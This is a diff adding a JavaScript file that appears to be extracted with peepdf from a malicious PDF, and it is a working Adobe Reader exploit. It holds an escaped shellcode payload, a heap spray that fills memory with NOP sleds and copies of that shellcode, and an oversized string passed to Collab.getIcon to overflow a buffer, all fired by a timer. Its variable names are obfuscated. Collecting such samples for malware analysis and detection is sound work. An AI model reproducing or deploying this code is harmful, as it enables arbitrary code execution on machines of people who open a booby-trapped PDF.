@@ -1,0 +1,30 @@
+// peepdf comment: Javascript code located in object 9 (version 0)
+
+function kaboom() {
+
+    var jhg = unescape("%u4141%u4141%uc933%u5db1%u22ba%u4e23%udb03%ud9c9%u2474%u58f4%u5031%u0310%u1050%uc083%uc004%ua5d6%u5e13%u0953%u38dd%u51da%u44dc%ua028%ua647%u5fab%uce72%u5fa7%uf182%uec48%u94e4%u2f30%u9eeb%u29eb%u478d%u90f9%u653b%ua717%u9b70%u393e%uda6a%ud0d2%uce2e%ua33f%u74d0%ubed5%u31f5%uddb0%u96eb%u8b48%ud778%u049d%u4192%uf7bb%ue681%u604f%u9265%u6290%ua2f7%u6629%ubfa6%uec6a%u7f26%ud454%u2bd5%u044b%u4964%uf231%uf7ef%ua89e%uf840%u3c0d%ud972%ua4b7%ubd29%u43cf%u6557%ued22%ucff2%u6e50%u8111%u2f4e%u4f82%u3c26%uaf31%u0bc9%ub6d3%u96b3%u5cbb%u6908%u9225%ub5ea%u6bb8%ua106%u1a7d%u4b4c%u45e4%u3396%uba9d%ud278%u5d06%u866b%uf251%u8e6a%u7978%u0234%u7238%ue9ff%ubaa4%ub075%ud8b5%ub4b3%u2071%u9865%u45e4%ude7b%uec80%u46d6%uc77a%ub6ed%ub1b5%u2d3f%u7854%u6409%u4c3e%ub0e0%u9ed9%ue89e%u2b7f%ub47d%u3393%u8db5%u79a3%u5923%ubdff%u269e%u9788%u8286%u5807%u555e%u788e%u7463%u6f87%u7d6a%u92c0%u696e%u860d%uf77b%uaa30%uc291%ub82d%u2f87%ue159%u3ba8%ue35e%u4aa4%uf374%u2aef%u0345%u91f8%u1fbb%ub3fd%u3ee0%u29f2%u31d5%u4d18%u4c1e%u7b46%u5629%u5184%u5d26%ua29c%u412c%ucabb%u6a5f%u19c9%u9b69%u2eab%ub65d%u5811%ucf8c%u535f%ud2a9%u6a6d%udc95%u6f9b%u85f2%ue40c%uc577%u2bf6%u1c57%u1a36%u6e95%u4c0f%ubfef%ua141%u903f%ub9f8%uc15a%u0c35%u788b%u1542%u5341");
+    var asdc = unescape("%u0A0A%u0A0A");
+
+    var xvcz = 20;
+    var vzxcv = xvcz + jhg.length;
+    while (asdc.length < vzxcv) asdc += asdc;
+    var vzxa = asdc.substring(0, vzxcv);
+    var xcvasd = asdc.substring(0, asdc.length - vzxcv);
+    while (xcvasd.length + vzxcv < 851968) xcvasd = xcvasd + xcvasd + vzxa;
+
+    var basd = new Array();
+    for (i = 0; i < 80; i++) {
+        basd[i] = xcvasd + jhg
+    }
+
+
+    var tom = unescape("%0B");
+    var kj = 0;
+    while (tom.length < 40000) tom += tom;
+    tom = "N" + tom + "DH.ico";
+
+    Collab.getIcon(tom);
+}
+
+var shaft = app.setTimeOut("kaboom();", 1000);
+
